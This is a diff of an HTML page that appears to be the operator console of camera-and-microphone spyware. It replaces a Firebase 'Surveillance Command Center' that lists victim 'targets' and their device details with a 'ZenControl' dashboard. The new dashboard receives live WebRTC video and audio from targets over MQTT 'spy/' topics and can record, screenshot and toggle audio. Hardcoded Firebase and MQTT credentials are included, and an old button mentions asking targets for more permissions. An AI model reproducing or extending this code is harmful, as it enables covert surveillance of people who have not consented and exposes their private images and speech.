@@ -1,369 +1,324 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>📡 Surveillance Dashboard LIVE</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZenControl • Dashboard</title>
     <style>
-        :root {
-            --neon-green: #00ff00;
-            --dark-bg: #0a0a0a;
-        }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
         body {
-            background: var(--dark-bg);
-            color: var(--neon-green);
-            min-height: 100vh;
+            margin: 0;
+            background: #111;
+            color: #0af;
+            font-family: 'Courier New', monospace;
             padding: 20px;
         }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px;
-            border-bottom: 2px solid var(--neon-green);
-            margin-bottom: 30px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
-        }
-        .live-badge {
-            background: #ff0000;
-            color: white;
-            padding: 8px 20px;
-            border-radius: 25px;
-            font-weight: bold;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .dashboard {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 25px;
-        }
-        .panel {
-            background: rgba(0, 30, 0, 0.2);
-            border: 1px solid var(--neon-green);
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
-        }
-        .panel h2 {
-            color: var(--neon-green);
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--neon-green);
+            border-bottom: 2px solid #0af;
             padding-bottom: 10px;
+            margin-bottom: 20px;
         }
-        .target-item {
-            background: rgba(0, 20, 0, 0.3);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 8px;
-            border-left: 5px solid var(--neon-green);
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .target-item:hover {
-            background: rgba(0, 40, 0, 0.4);
-            transform: translateX(5px);
-        }
-        .target-item.active {
-            background: rgba(0, 60, 0, 0.5);
-            border-left: 5px solid #ff0000;
-        }
-        .data-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-        }
-        .data-card {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            border-radius: 8px;
-            padding: 15px;
-        }
-        .data-label {
-            font-size: 0.9rem;
-            color: #8f8;
-            margin-bottom: 5px;
-        }
-        .data-value {
-            font-size: 1.1rem;
+        .logo {
+            font-size: 1.8rem;
             font-weight: bold;
-            color: white;
-            word-break: break-all;
+            color: #0af;
         }
-        .logs {
-            grid-column: 1 / -1;
+        .status {
+            background: #222;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 0.9rem;
+        }
+        .online { color: #0f0; }
+        .offline { color: #f00; }
+        .container { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        .feed-container {
+            background: #000;
+            border: 2px solid #0af;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        #remoteVideo {
+            width: 100%;
+            max-height: 500px;
+            border-radius: 5px;
+            background: #000;
+        }
+        .controls {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .btn {
+            background: #0af;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        .btn:hover { background: #0cf; }
+        .btn.rec { background: #f00; }
+        .log {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
             height: 300px;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
-            padding: 20px;
+            font-size: 0.8rem;
             margin-top: 20px;
         }
         .log-entry {
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
-            font-size: 0.9rem;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed #333;
         }
-        .timestamp {
-            color: #0f0;
-        }
-        .controls {
-            display: flex;
-            gap: 15px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        .control-btn {
-            background: rgba(0, 50, 0, 0.5);
-            color: var(--neon-green);
-            border: 1px solid var(--neon-green);
-            padding: 12px 20px;
+        .target-list { margin-top: 20px; }
+        .target-item {
+            padding: 10px;
+            background: #222;
+            margin: 5px 0;
             border-radius: 5px;
             cursor: pointer;
-            transition: all 0.3s;
         }
-        .control-btn:hover {
-            background: rgba(0, 100, 0, 0.7);
-            box-shadow: 0 0 15px var(--neon-green);
-        }
+        .target-item:hover { background: #333; }
     </style>
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
-        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
-        
-        // 🔥 CONFIG YANG SAMA
-        const firebaseConfig = {
-            apiKey: "AIzaSyCYW9Q7arkMiseBLO3z4xoe_7G43vHBRU",
-            authDomain: "survei-fllal.firebaseapp.com",
-            databaseURL: "https://survei-fllal-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "survei-fllal",
-            storageBucket: "survei-fllal.firebasestorage.app",
-            messagingSenderId: "769641856914",
-            appId: "1:769641856914:web:3be7b2cf77ccb9bab9427b"
-        };
-        
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        let selectedTarget = null;
-        
-        function initializeDashboard() {
-            // Listen for all targets
-            const targetsRef = ref(database, 'targets');
-            
-            onValue(targetsRef, (snapshot) => {
-                const data = snapshot.val();
-                updateTargetsList(data);
-                
-                // Auto-select first target if none selected
-                if (!selectedTarget && data) {
-                    const firstTarget = Object.keys(data)[0];
-                    if (firstTarget) {
-                        selectTarget(firstTarget);
-                    }
-                }
-                
-                // Update selected target details
-                if (selectedTarget && data && data[selectedTarget]) {
-                    updateTargetDetails(data[selectedTarget]);
-                }
-            });
-            
-            addLog('🟢 Dashboard connected to Firebase');
-            addLog(`📡 Database URL: ${firebaseConfig.databaseURL}`);
-        }
-        
-        function updateTargetsList(targets) {
-            const container = document.getElementById('targetsList');
-            
-            if (!targets) {
-                container.innerHTML = '<div class="target-item">No active targets...</div>';
-                return;
-            }
-            
-            let html = '';
-            Object.entries(targets).forEach(([id, target]) => {
-                const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
-                const isActive = timeAgo < 30;
-                
-                html += `
-                    <div class="target-item ${selectedTarget === id ? 'active' : ''}" 
-                         onclick="selectTarget('${id}')">
-                        <div style="display: flex; justify-content: space-between;">
-                            <div>
-                                <strong>${id.substring(0, 15)}...</strong><br>
-                                <small>${target.device?.platform || 'Unknown'}</small>
-                            </div>
-                            <div style="text-align: right;">
-                                <span style="color: ${isActive ? '#0f0' : '#ff0'}">
-                                    ${isActive ? '🟢 LIVE' : '🟡 IDLE'}
-                                </span><br>
-                                <small>${timeAgo}s ago</small>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            container.innerHTML = html;
-        }
-        
-        window.selectTarget = function(targetId) {
-            selectedTarget = targetId;
-            updateTargetsList(); // Refresh list to highlight selected
-            
-            // Listen for this target's updates
-            const targetRef = ref(database, 'targets/' + targetId);
-            onValue(targetRef, (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    updateTargetDetails(data);
-                }
-            });
-            
-            addLog(`🎯 Selected target: ${targetId}`);
-        };
-        
-        function updateTargetDetails(target) {
-            const container = document.getElementById('targetDetails');
-            const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
-            
-            container.innerHTML = `
-                <div class="data-grid">
-                    <div class="data-card">
-                        <div class="data-label">Target ID</div>
-                        <div class="data-value">${target.id || 'N/A'}</div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Status</div>
-                        <div class="data-value" style="color: ${timeAgo < 30 ? '#0f0' : '#ff0'}">
-                            ${timeAgo < 30 ? '🟢 LIVE' : '🟡 IDLE'} (${timeAgo}s ago)
-                        </div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Device</div>
-                        <div class="data-value">${target.device?.platform || 'Unknown'}</div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Screen Size</div>
-                        <div class="data-value">${target.device?.screen || 'Unknown'}</div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Battery</div>
-                        <div class="data-value">
-                            ${typeof target.battery === 'object' ? 
-                              target.battery.level || 'Unknown' : 
-                              target.battery || 'Unknown'}
-                        </div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Camera/Mic</div>
-                        <div class="data-value" style="color: ${target.media === 'ACTIVE' ? '#0f0' : '#f00'}">
-                            ${target.media === 'ACTIVE' ? '✅ ACTIVE' : '❌ INACTIVE'}
-                        </div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Timezone</div>
-                        <div class="data-value">${target.location?.timezone || 'Unknown'}</div>
-                    </div>
-                    <div class="data-card">
-                        <div class="data-label">Language</div>
-                        <div class="data-value">${target.device?.language || 'Unknown'}</div>
-                    </div>
-                </div>
-                <div style="margin-top: 20px;">
-                    <div class="data-label">User Agent</div>
-                    <div class="data-value" style="font-size: 0.8rem; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px;">
-                        ${target.device?.userAgent || 'Unknown'}
-                    </div>
-                </div>
-                <div class="controls">
-                    <button class="control-btn" onclick="deleteTarget('${target.id}')">🗑️ DELETE TARGET</button>
-                    <button class="control-btn" onclick="simulateAlert('${target.id}')">🚨 SEND ALERT</button>
-                    <button class="control-btn" onclick="exportData('${target.id}')">📥 EXPORT DATA</button>
-                </div>
-            `;
-            
-            // Update logs
-            if (timeAgo < 5) {
-                addLog(`📡 Live update from ${target.id}`);
-            }
-        }
-        
-        function addLog(message) {
-            const logs = document.getElementById('logContainer');
-            const timestamp = new Date().toLocaleTimeString();
-            const log = document.createElement('div');
-            log.className = 'log-entry';
-            log.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
-            logs.appendChild(log);
-            logs.scrollTop = logs.scrollHeight;
-        }
-        
-        window.deleteTarget = function(targetId) {
-            if (confirm(`Delete target ${targetId}?`)) {
-                const targetRef = ref(database, 'targets/' + targetId);
-                remove(targetRef)
-                .then(() => {
-                    addLog(`🗑️ Deleted target: ${targetId}`);
-                    selectedTarget = null;
-                })
-                .catch(error => {
-                    addLog(`❌ Error deleting: ${error.message}`);
-                });
-            }
-        };
-        
-        window.simulateAlert = function(targetId) {
-            addLog(`🚨 Alert sent to target: ${targetId}`);
-            alert('Target would receive a notification requesting more permissions');
-        };
-        
-        window.exportData = function(targetId) {
-            addLog(`📥 Exporting data for: ${targetId}`);
-            alert('Data exported to clipboard (simulated)');
-        };
-        
-        // Initialize on load
-        document.addEventListener('DOMContentLoaded', initializeDashboard);
-    </script>
 </head>
 <body>
     <div class="header">
-        <h1>📡 SURVEILLANCE COMMAND CENTER</h1>
-        <div class="live-badge">FIREBASE LIVE</div>
+        <div class="logo">ZENCONTROL DASHBOARD</div>
+        <div class="status" id="status">🔴 OFFLINE</div>
     </div>
-    
-    <div class="dashboard">
-        <div class="panel">
-            <h2>🎯 ACTIVE TARGETS</h2>
-            <div id="targetsList">
-                Loading targets from Firebase...
+
+    <div class="container">
+        <div class="feed-container">
+            <h3>📡 LIVE FEED - <span id="currentTarget">No target</span></h3>
+            <video id="remoteVideo" autoplay playsinline></video>
+            <div style="margin-top: 15px;">
+                <button class="btn rec" id="recBtn">● START RECORDING</button>
+                <button class="btn" id="snapBtn">📸 CAPTURE FRAME</button>
+                <button class="btn" id="audioBtn">🎤 TOGGLE AUDIO</button>
+                <button class="btn" id="disconnectBtn">⚠️ DISCONNECT</button>
             </div>
         </div>
-        
-        <div class="panel">
-            <h2>📊 TARGET DETAILS</h2>
-            <div id="targetDetails">
-                Select a target from the left panel
+
+        <div class="controls">
+            <h3>⚙️ ACTIVE TARGETS</h3>
+            <div class="target-list" id="targetList">
+                <div class="target-item" style="color:#777">Waiting for connections...</div>
             </div>
-        </div>
-        
-        <div class="logs">
-            <h2>📝 SYSTEM LOGS</h2>
-            <div id="logContainer">
-                <div class="log-entry">
-                    <span class="timestamp">[00:00:00]</span> System starting...
-                </div>
+            
+            <h3 style="margin-top:30px;">📊 LOGS</h3>
+            <div class="log" id="log">
+                <div class="log-entry">[<span id="time">00:00:00</span>] Dashboard initialized.</div>
             </div>
         </div>
     </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <script>
+        const remoteVideo = document.getElementById('remoteVideo');
+        const statusEl = document.getElementById('status');
+        const logEl = document.getElementById('log');
+        const targetList = document.getElementById('targetList');
+        const currentTargetEl = document.getElementById('currentTarget');
+        const recBtn = document.getElementById('recBtn');
+        const snapBtn = document.getElementById('snapBtn');
+        const audioBtn = document.getElementById('audioBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+
+        let peer = null;
+        let currentSessionId = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let audioEnabled = true;
+        const activeTargets = new Map();
+
+        // HiveMQ Connection
+        const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');
+
+        ws.onopen = () => {
+            log('Connected to HiveMQ Cloud');
+            statusEl.innerHTML = '🟢 HIVEMQ CONNECTED';
+            statusEl.className = 'status online';
+            
+            // Subscribe ke semua signal dari target
+            ws.send(JSON.stringify({
+                cmd: 'subscribe',
+                topics: ['spy/DASHBOARD/signal'],
+                username: 'Zang',
+                password: 'ZingZangRulez'
+            }));
+        };
+
+        ws.onmessage = (event) => {
+            const msg = JSON.parse(event.data);
+            
+            if (msg.topic === 'spy/DASHBOARD/signal') {
+                const data = JSON.parse(msg.payload);
+                const { sessionId, signal } = data;
+                
+                if (!activeTargets.has(sessionId)) {
+                    // New target detected
+                    addTarget(sessionId);
+                }
+                
+                // Jika target ini sedang dipilih, process signal
+                if (sessionId === currentSessionId && peer) {
+                    peer.signal(signal);
+                }
+                
+                // Auto-connect ke target pertama jika belum ada koneksi
+                if (!currentSessionId && activeTargets.size === 1) {
+                    selectTarget(sessionId);
+                }
+            }
+        };
+
+        function addTarget(sessionId) {
+            activeTargets.set(sessionId, { connected: false });
+            
+            const targetItem = document.createElement('div');
+            targetItem.className = 'target-item';
+            targetItem.innerHTML = `📱 ${sessionId} <span style="float:right; color:#0f0">● LIVE</span>`;
+            targetItem.onclick = () => selectTarget(sessionId);
+            
+            targetList.appendChild(targetItem);
+            log(`New target detected: ${sessionId}`);
+        }
+
+        function selectTarget(sessionId) {
+            if (peer) peer.destroy();
+            
+            currentSessionId = sessionId;
+            currentTargetEl.textContent = sessionId;
+            
+            // Update UI
+            document.querySelectorAll('.target-item').forEach(item => {
+                item.style.background = item.textContent.includes(sessionId) ? '#0af' : '#222';
+                item.style.color = item.textContent.includes(sessionId) ? '#000' : '#0af';
+            });
+            
+            // Create new peer connection
+            peer = new SimplePeer({
+                initiator: false,
+                config: {
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:global.stun.twilio.com:3478' }
+                    ]
+                }
+            });
+
+            peer.on('signal', data => {
+                // Kirim balik ke target
+                ws.send(JSON.stringify({
+                    cmd: 'publish',
+                    topic: `spy/${sessionId}/signal`,
+                    payload: JSON.stringify(data),
+                    username: 'Zang',
+                    password: 'ZingZangRulez'
+                }));
+            });
+
+            peer.on('stream', stream => {
+                remoteVideo.srcObject = stream;
+                log(`Stream active from ${sessionId}`);
+                statusEl.innerHTML = `🎯 ${sessionId} - LIVE`;
+            });
+
+            peer.on('close', () => {
+                log(`Target ${sessionId} disconnected.`);
+                statusEl.innerHTML = '🔴 TARGET OFFLINE';
+            });
+            
+            log(`Connecting to ${sessionId}...`);
+        }
+
+        // Control functions
+        recBtn.onclick = () => {
+            if (!mediaRecorder) {
+                const stream = remoteVideo.srcObject;
+                if (!stream) return alert('No active stream');
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `spy-record-${Date.now()}.webm`;
+                    a.click();
+                };
+                mediaRecorder.start();
+                recBtn.textContent = '⏹ STOP RECORDING';
+                log('Recording started.');
+            } else {
+                mediaRecorder.stop();
+                mediaRecorder = null;
+                recordedChunks = [];
+                recBtn.textContent = '● START RECORDING';
+                log('Recording saved.');
+            }
+        };
+
+        snapBtn.onclick = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = remoteVideo.videoWidth;
+            canvas.height = remoteVideo.videoHeight;
+            canvas.getContext('2d').drawImage(remoteVideo, 0, 0);
+            const link = document.createElement('a');
+            link.download = `snap-${Date.now()}.png`;
+            link.href = canvas.toDataURL();
+            link.click();
+            log('Screenshot captured.');
+        };
+
+        audioBtn.onclick = () => {
+            if (remoteVideo.srcObject) {
+                const audioTracks = remoteVideo.srcObject.getAudioTracks();
+                audioTracks.forEach(track => {
+                    track.enabled = !track.enabled;
+                });
+                audioEnabled = !audioEnabled;
+                audioBtn.textContent = audioEnabled ? '🎤 AUDIO ON' : '🔇 AUDIO OFF';
+                log(`Audio ${audioEnabled ? 'enabled' : 'disabled'}`);
+            }
+        };
+
+        disconnectBtn.onclick = () => {
+            if (peer) {
+                peer.destroy();
+                peer = null;
+                remoteVideo.srcObject = null;
+                currentSessionId = null;
+                currentTargetEl.textContent = 'No target';
+                statusEl.innerHTML = '🟢 READY';
+                log('Disconnected from target.');
+            }
+        };
+
+        function log(text) {
+            const now = new Date();
+            const time = now.toTimeString().split(' ')[0];
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `[${time}] ${text}`;
+            logEl.appendChild(entry);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // Update time
+        setInterval(() => {
+            document.getElementById('time').textContent = new Date().toTimeString().split(' ')[0];
+        }, 1000);
+    </script>
 </body>
-    </html>
+                                            </html>
